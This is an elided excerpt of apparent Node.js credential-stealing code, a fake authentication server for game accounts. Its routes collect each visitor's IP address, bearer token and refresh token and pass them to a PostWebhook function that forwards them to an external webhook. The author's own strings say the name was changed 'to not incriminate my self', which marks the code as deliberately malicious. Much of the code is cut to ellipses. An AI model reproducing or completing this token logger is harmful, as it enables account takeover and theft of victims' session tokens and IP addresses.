...
app.get('/', async (req, res) => {
    ...
    try {
        ...
        const ip = getIp(req);
        PostWebhook(false, username, uuid, ip, BearerToken, RefreshToken)
...
app.get('/refresh', async (req, res) => {
    ...
    GetPlayer(BearerToken).then(result => {
        ...
        uuid = result[0]
        username = result[1]
            PostWebhook(true, username, uuid, ip, BearerToken, RefreshToken)
...
function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token) {
    ...
    let data = {
        "username": "change name again to not incriminate my self Auth",
        ...
        "embeds": [
            ...
            footer: {
                    "text": "🌟 i have to change this Auth by eco ig(real) 🌟",
